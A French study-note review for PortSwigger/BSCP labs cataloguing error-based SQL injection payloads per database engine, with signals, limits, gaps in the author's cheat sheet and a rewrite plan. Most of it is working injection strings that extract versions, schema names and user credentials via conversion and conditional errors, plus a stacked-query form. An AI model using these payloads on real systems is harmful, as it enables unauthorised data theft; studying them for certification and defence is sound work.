**V-O6 - Agrégation avec `LISTAGG`**
- Forme : `... (SELECT LISTAGG(<COLONNE>,',') WITHIN GROUP (ORDER BY <COLONNE>) FROM <TABLE>) ...` à insérer dans V-O1 ou V-O2.
- Contexte : lire toutes les lignes d'un coup.
- Signal : liste entière dans le message.
- Limite : chaîne limitée à 4000 octets (`ORA-01489` au-delà) ; troncature du message.
- Destination : Verbose errors, Oracle ; section plusieurs lignes.
- Présence : absent de la note (présent uniquement dans la note Union), absent de la cheat sheet (proposé SQL-E38).

**V-O7 - Version, base et schéma**
- Forme version : `... (SELECT banner FROM v$version WHERE ROWNUM=1) ...`
- Forme tables : `... (SELECT table_name FROM all_tables WHERE ROWNUM=1) ...`
- Forme colonnes : `... (SELECT column_name FROM all_tab_columns WHERE table_name='<TABLE_EN_MAJUSCULES>' AND ROWNUM=1) ...`
- Contexte : à insérer dans V-O1 ou V-O2.
- Signal : valeur citée dans le message.
- Limite : noms d'objets en majuscules ; droits de lecture sur `v$version` ; pour les rangs suivants, combiner avec V-O5.
- Destination : Verbose errors, Oracle ; preuve de concept et énumération.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E39).

#### Microsoft SQL Server

**V-S1 - `CONVERT` en entier**
- Forme : `' AND 1=CONVERT(int,(SELECT TOP 1 <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'))-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int.` (`varchar` si la colonne est de ce type).
- Limite : une seule ligne ; aucune erreur si la valeur est un nombre en texte (voir V-S6).
- Destination : Verbose errors, SQL Server.
- Présence : note ligne 145 ; cheat sheet SQL-E6.

**V-S2 - `CAST` en entier**
- Forme : `' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- -`
- Contexte : équivalent de V-S1.
- Signal et limite : identiques à V-S1.
- Destination : Verbose errors, SQL Server.
- Présence : note ligne 147 ; cheat sheet SQL-E21.

**V-S3 - Version, utilisateur, base courante**
- Forme : `' AND 1=CONVERT(int,@@version)-- -` ; remplacer par `SYSTEM_USER`, `USER_NAME()`, `DB_NAME()` ou `@@servername`.
- Contexte : preuve de concept.
- Signal : message de conversion avec la valeur.
- Limite : aucune.
- Destination : Verbose errors, SQL Server ; preuve de concept.
- Présence : `@@version` et `SYSTEM_USER` en note ligne 148 et cheat sheet SQL-E12 ; `USER_NAME()`, `DB_NAME()`, `@@servername` absents des deux.

**V-S4 - Agrégation de lignes**
- Forme 2017 et suivants : `' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -`
- Forme antérieure : `' AND 1=CONVERT(int,CONVERT(varchar(max),(SELECT name+',' FROM sys.tables FOR XML PATH(''))))-- -`
- Contexte : lire plusieurs lignes en une requête.
- Signal : liste dans le message.
- Limite : sans la conversion intermédiaire en `varchar(max)`, le type `xml` est refusé ; les caractères spéciaux sont échappés en entités XML ; troncature du message.
- Destination : Verbose errors, SQL Server ; section plusieurs lignes.
- Présence : note ligne 149 et cheat sheet SQL-E13, mais la forme `FOR XML PATH` y est à corriger (voir 1.1.3).

**V-S5 - Ligne de rang N et schéma**
- Forme avec `NOT IN` : `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN (SELECT TOP <N> name FROM sys.tables)))-- -`
- Forme 2012 et suivants : `' AND 1=CONVERT(int,(SELECT name FROM sys.tables ORDER BY 1 OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY))-- -`
- Forme colonnes : `' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='<TABLE>' AND column_name NOT IN (...)))-- -` où la liste exclut les colonnes déjà lues.
- Contexte : énumérer les objets un par un.
- Signal : nom cité dans le message.
- Limite : `OFFSET ... FETCH` exige un `ORDER BY`.
- Destination : Verbose errors, SQL Server ; section plusieurs lignes.
- Présence : absent de la note (seule l'agrégation de `sys.tables`), absent de la cheat sheet (proposé SQL-E43 et SQL-E44).

**V-S6 - Garde de préfixe pour valeurs numériques**
- Forme : `' AND 1=CONVERT(int,'~'+(SELECT TOP 1 <COLONNE> FROM <TABLE>))-- -`
- Contexte : donnée qui ressemble à un nombre.
- Signal : message de conversion avec `~<valeur>`.
- Limite : une valeur `NULL` donne `NULL` ; utiliser `ISNULL`. Le signe plus doit être envoyé sous la forme `%2b` dans une URL ou un cookie.
- Destination : Verbose errors, SQL Server ; section valeurs numériques.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E45).

**V-S7 - Erreurs de regroupement**
- Forme : `' HAVING 1=1-- -` puis `' GROUP BY <COLONNE> HAVING 1=1-- -`
- Contexte : anciennes versions ; la requête d'origine liste des colonnes.
- Signal : `Column '<table>.<colonne>' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause`, une colonne par requête.
- Limite : ne lit pas de données, seulement la structure de la requête d'origine ; technique d'appoint.
- Destination : Verbose errors, SQL Server (mention courte).
- Présence : note ligne 150 ; cheat sheet SQL-E22.

#### SQLite

Aucun payload de type verbose error sur les données : `CAST` ne lève pas d'erreur (renvoie 0) et il n'y a pas de fonction XML. Si l'application affiche les erreurs brutes, `no such table: <nom>` et `no such column: <nom>` confirment ou infirment des noms d'objets, sans lire de valeur. Cette limite se dit en une phrase dans la note. Présence : ligne 157 de la note.

### 3.2 Catégorie conditional errors

Principe commun : `CASE WHEN (<COND>) THEN <expression qui échoue> ELSE <valeur du même type> END`. Les deux branches doivent avoir le même type. Extraction : `SUBSTR`/`SUBSTRING(<COLONNE>,<POS>,1)='<c>'` pour un caractère, `LENGTH(<COLONNE>)><N>` (`LEN` sur SQL Server) pour la longueur, `ASCII(...)><N>` (`unicode(...)` sur SQLite) pour la dichotomie. Vérifier d'abord que la ligne cible existe : un `WHERE username='x'` sans ligne donne "pas d'erreur" et se confond avec "condition fausse".
Dans une valeur de cookie, la forme par concaténation (`'||(...)||'`) évite le commentaire final et lit la ligne d'origine : elle s'applique aux moteurs qui concatènent avec `||` (Oracle, PostgreSQL, SQLite).

#### PostgreSQL

**C-PG1 - Division par zéro**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/(SELECT 0) ELSE 1 END)-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `ERROR: division by zero` si la condition est vraie, HTTP 500 ou page d'erreur ; page normale sinon.
- Limite : `1/0` seul est évalué à l'avance et lève l'erreur dans tous les cas ; `(SELECT 0)` l'évite.
- Destination : Conditional errors, PostgreSQL.
- Présence : note ligne 117 ; cheat sheet SQL-E3.

**C-PG2 - Conversion qui échoue (forme corrigée)**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN CAST((SELECT 'a') AS int) ELSE 1 END)-- -`
- Contexte : alternative quand la division est filtrée.
- Signal : `invalid input syntax for type integer: "a"` si la condition est vraie.
- Limite : la forme `CAST('a' AS int)` sans sous-requête échoue toujours (évaluation à l'avance).
- Destination : Conditional errors, PostgreSQL.
- Présence : forme erronée en note ligne 119 et cheat sheet SQL-E19, à remplacer.

**C-PG3 - Sous-requête multi-lignes**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)-- -`
- Contexte : alternative sans division ni conversion.
- Signal : `more than one row returned by a subquery used as an expression` si la condition est vraie.
- Limite : aucune particulière.
- Destination : Conditional errors, PostgreSQL.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E31).

**C-PG4 - Forme par concaténation**
- Forme : `'||(SELECT CASE WHEN (<COND>) THEN CAST(1/(SELECT 0) AS text) ELSE '' END)||'`
- Contexte : valeur lue par la requête d'origine, pas de commentaire à placer.
- Signal : `division by zero` si vrai.
- Limite : même limite que C-PG1.
- Destination : Conditional errors, PostgreSQL.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E32).

#### MySQL et MariaDB

**C-M1 - `IF` avec sous-requête multi-lignes**
- Forme : `' AND IF(<COND>,(SELECT table_name FROM information_schema.tables),'a')-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `Subquery returns more than 1 row` si vrai ; page normale sinon.
- Limite : la table doit avoir au moins deux lignes ; `1/0` ne lève pas d'erreur en lecture sur MySQL (résultat `NULL`).
- Destination : Conditional errors, MySQL et MariaDB.
- Présence : note ligne 100 ; cheat sheet SQL-E11 (variante SQL-E20).

**C-M2 - `CASE` avec `UNION`**
- Forme : `' AND (SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- -`
- Contexte : alternative sans table de référence.
- Signal : `Subquery returns more than 1 row` si vrai.
- Limite : aucune particulière.
- Destination : Conditional errors, MySQL et MariaDB.
- Présence : note ligne 102 ; cheat sheet SQL-E20.

#### Oracle

**C-O1 - Division par zéro convertie en chaîne**
- Forme : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- Contexte : valeur de cookie, forme par concaténation.
- Signal : `ORA-01476: divisor is equal to zero`, HTTP 500 dans le cas du lab Oracle ; page normale si faux.
- Limite : `TO_CHAR` garde un type cohérent entre les branches ; `FROM dual` obligatoire. Pour lire une table, remplacer `FROM dual` par `FROM <TABLE> WHERE username='<UTILISATEUR>'` (ligne existante requise).
- Destination : Conditional errors, Oracle.
- Présence : note ligne 125 ; cheat sheet SQL-E1.

**C-O2 - Forme `AND`**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END FROM dual)-- -`
- Contexte : paramètre où la concaténation n'est pas possible, ou contexte numérique (retirer l'apostrophe initiale).
- Signal : `ORA-01476` si vrai.
- Limite : aucune particulière.
- Destination : Conditional errors, Oracle.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E40).

**C-O3 - `TO_NUMBER` qui échoue**
- Forme : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(TO_NUMBER('a')) ELSE '' END FROM dual)||'`
- Contexte : alternative quand la division est filtrée.
- Signal : `ORA-01722: invalid number` si vrai.
- Limite : ne cite pas la valeur, sert uniquement d'oracle de type conditional error.
- Destination : Conditional errors, Oracle.
- Présence : mentionné en prose ligne 139, sans payload ; absent de la cheat sheet (proposé SQL-E41).

**C-O4 - Sous-requête multi-lignes**
- Forme : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR((SELECT 1 FROM dual UNION ALL SELECT 2 FROM dual)) ELSE '' END FROM dual)||'`
- Contexte : alternative sans division.
- Signal : `ORA-01427: single-row subquery returns more than one row` si vrai.
- Limite : aucune particulière.
- Destination : Conditional errors, Oracle.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E42).

#### Microsoft SQL Server

**C-S1 - Division par zéro**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END)-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : les deux branches doivent être de type entier ; ne pas mettre `'a'` dans la branche `ELSE` (voir 1.1.1).
- Destination : Conditional errors, SQL Server.
- Présence : note ligne 152 ; cheat sheet SQL-E2.

**C-S2 - Stacked query**
- Forme : `'; IF (<COND>) SELECT 1/0-- -`
- Contexte : interface qui accepte plusieurs instructions.
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : dans un cookie, le point-virgule s'encode `%3B` ; l'instruction empilée peut modifier des données, la réserver à des fonctions inoffensives.
- Destination : Conditional errors, SQL Server.
- Présence : note ligne 154 ; cheat sheet SQL-E23.

**C-S3 - Conversion qui échoue**
- Forme : `' AND 1=(SELECT CASE WHEN (<COND>) THEN CONVERT(int,'a') ELSE 1 END)-- -`
- Contexte : alternative quand la division est filtrée.
- Signal : `Conversion failed when converting the varchar value 'a' to data type int.` si vrai.
- Limite : l'apostrophe est nécessaire ; sinon utiliser `CHAR(97)`.
- Destination : Conditional errors, SQL Server.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E46).

**C-S4 - Forme par concaténation**
- Forme : `'+(SELECT CASE WHEN (<COND>) THEN CAST(1/0 AS varchar) ELSE '' END)+'`
- Contexte : valeur de cookie, sans commentaire final.
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : le signe plus s'envoie sous la forme `%2b`.
- Destination : Conditional errors, SQL Server.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E47).

#### SQLite

**C-L1 - Dépassement d'entier**
- Forme : `' AND (SELECT CASE WHEN (<COND>) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `integer overflow` si vrai.
- Limite : `abs` du plus petit entier signé ; comportement stable sur les versions courantes.
- Destination : Conditional errors, SQLite.
- Présence : note ligne 159 ; cheat sheet SQL-E16.

**C-L2 - JSON mal formé**
- Forme : `' AND (SELECT CASE WHEN (<COND>) THEN json('{') ELSE 1 END)=1-- -`
- Contexte : alternative si C-L1 est filtré.
- Signal : `malformed JSON` si vrai.
- Limite : fonctions JSON requises (intégrées sur les versions récentes, extension JSON1 sur les anciennes).
- Destination : Conditional errors, SQLite.
- Présence : note ligne 160 ; cheat sheet SQL-E25.

### 3.3 Payloads de détection et de reconnaissance (destination : Détection)

- Apostrophe seule, puis deux apostrophes (`'` puis `''`) : erreur puis retour à la normale. Présent (ligne 34, SQL-D1 et SQL-D2).
- Concaténation neutre `'||(SELECT '')||'` : réponse normale si l'injection est dans une chaîne ; si l'erreur apparaît, essayer `'||(SELECT '' FROM dual)||'` (Oracle). Présent (lignes 35 et 36).
- `' AND CAST((SELECT 1) AS int)-- -` : voir V-PG8. Présent.
- Sous-requête sur table inexistante : erreur uniquement quand le serveur exécute du SQL. Présent (ligne 35).

### 3.4 Synthèse : ce qui manque dans la note et dans la cheat sheet

Absent des deux (à ajouter dans la note puis dans la cheat sheet, références proposées SQL-E26 à SQL-E47) :
- PostgreSQL : V-PG3 (garde de préfixe), V-PG4 (ligne de rang N), V-PG6 (schéma), V-PG7 (version, utilisateur, base), C-PG3 (multi-lignes), C-PG4 (concaténation).
- MySQL et MariaDB : V-M4 (`GTID_SUBSET`), V-M5 (`EXP(~...)`), V-M6 (version, utilisateur, base), V-M7 (schéma et rang N), V-M8 (agrégation tranchée).
- Oracle : V-O5 (rang N), V-O6 (`LISTAGG`), V-O7 (version et schéma), C-O2 (forme `AND`), C-O3 (`TO_NUMBER`), C-O4 (multi-lignes).
- SQL Server : V-S5 (rang N et schéma), V-S6 (garde de préfixe), C-S3 (conversion), C-S4 (concaténation), et les fonctions `USER_NAME()`, `DB_NAME()`, `@@servername` de V-S3.
- SQLite : rien de nouveau, sauf à rappeler que la forme par concaténation s'applique.

Présent mais à corriger : C-PG2 (note ligne 119, cheat sheet SQL-E19), V-S4 forme `FOR XML PATH` (note ligne 149, cheat sheet SQL-E13), exemple SQL Server de la note ligne 63.
Présent dans la note seulement par son nom, sans payload : `GTID_SUBSET` et `EXP` (ligne 104), `ORA-01722` (ligne 139), `LIMIT 1 OFFSET n` PostgreSQL (ligne 115).
Présent dans la note et la cheat sheet, sans modification nécessaire : V-PG1, V-PG2, V-PG5, V-PG8, V-M1, V-M2, V-M3, V-O1, V-O2, V-O3, V-O4, V-S1, V-S2, V-S7, C-PG1, C-M1, C-M2, C-O1, C-S1, C-S2, C-L1, C-L2.

---

## 4. Plan de réécriture de la note

Principe : un seul endroit pour chaque information, payloads groupées par famille puis par moteur, renvois vers les notes voisines pour tout ce qui est générique. La section "Labs PortSwigger" et le "Journal des labs" restent tels quels, en fin de note, sans modification.

1. **En bref** (5 à 6 lignes) : deux familles (verbose errors, conditional errors), condition d'exploitation de chacune, lien vers la note Blind pour la logique booléenne. Supprimer les redondances des lignes 14 à 17.
2. **Choisir la famille et la forme** : arbre de décision (message affiché, code seul, rien), forme `AND` contre forme par concaténation, contexte numérique, `ORDER BY`, où lire l'erreur (réponse brute). Remplace "Types et variantes" (lignes 19 à 29) et l'arbre actuel (lignes 39 à 42).
3. **Détection** : séquence courte (apostrophe, deux apostrophes, concaténation neutre, table inexistante, `FROM dual`), paire vrai et faux répétée, tableau de reconnaissance du moteur étendu (messages de syntaxe en plus des messages de verbose errors), payload PostgreSQL V-PG8 ici.
4. **Conventions des payloads** : placeholders, `-- -`, encodage en cookie (renvoi vers `SQL-injection.md`), règle lecture seule et une ligne à la fois.
5. **Tableau des prérequis par moteur** : versions et droits (fonctions XML MySQL, `GTID_SUBSET`, `XMLTYPE` et XDB, `UTL_INADDR` et ACL, `CTXSYS`, `STRING_AGG`, JSON SQLite).
6. **Verbose errors** : principe en 3 lignes (conversion, citation de l'entrée), puis un sous-titre par moteur (PostgreSQL, MySQL et MariaDB, Oracle, SQL Server, SQLite) avec, pour chaque payload, forme, signal et limite (format du catalogue de la partie 3, sans les champs "Présence" ni "Destination"). Y inclure `GTID_SUBSET` et `EXP`, retirer `JSON_KEYS`, corriger `FOR XML PATH`.
7. **Contraintes d'extraction** (nouvelle section, issue des cas pratiques) :
   - une ligne à la fois et rang N par moteur ;
   - plusieurs lignes en une requête (agrégats et leurs limites) ;
   - message tronqué : causes, payload courte, tranches (formule de position), longueur d'abord, fonction à message plus long ;
   - valeur du cookie à vider : raison, contrepartie, repli ;
   - valeurs numériques, `NULL`, caractères spéciaux (encodage hexadécimal).
8. **Conditional errors** : principe `CASE` avec la règle "mêmes types dans les deux branches" et l'exemple SQL Server corrigé ; un sous-titre par moteur (payloads C-PG1 à C-L2) ; extraction (existence de la ligne d'abord, longueur, caractère, dichotomie par renvoi à la note Blind) ; automatisation (Intruder, colonne Status, Grep - Match sur le message).
9. **Filter bypass propre aux Error-based SQLi** : liste par type de filtre (partie 1.4), avec renvoi à la section "Contournement de filtre" de `SQL-injection.md` pour le général.
10. **Pièges BSCP** (6 à 8 lignes, uniquement ce qui n'est pas dit ailleurs) : ligne non lue, utilisateur inexistant, `1/0` non universel (une ligne qui renvoie au catalogue), cookie de session intact, lecture de la réponse brute, vérifier la valeur citée avant de conclure.
11. **Prévention** (4 à 5 lignes) : messages génériques et journalisation, retrait de `EXECUTE` à `PUBLIC` sur les paquetages Oracle, réponses uniformes, renvoi vers `SQL-injection.md` et `Blind-SQL-injection.md`.
12. **Labs PortSwigger et Journal des labs** : inchangés. L'incohérence de coches signalée au point 1.9 est à arbitrer par l'utilisateur.
13. **Liens** : inchangés.

Corrections de langue à appliquer pendant la réécriture : "deux familles", "détaillés", suppression de "fuiter" et de "plier", "payload" partout à la place de "charge utile", deux-points espacés partout, titres hiérarchisés, tirets normaux, pas de flèches.

Mises à jour liées de la cheat sheet (section "SQL injection - Error-based") après la réécriture : corriger SQL-E13 et SQL-E19, ajouter SQL-E26 à SQL-E47 selon la partie 3.4, regrouper SQL-E11 et SQL-E20, harmoniser les commentaires finaux sur `-- -`.
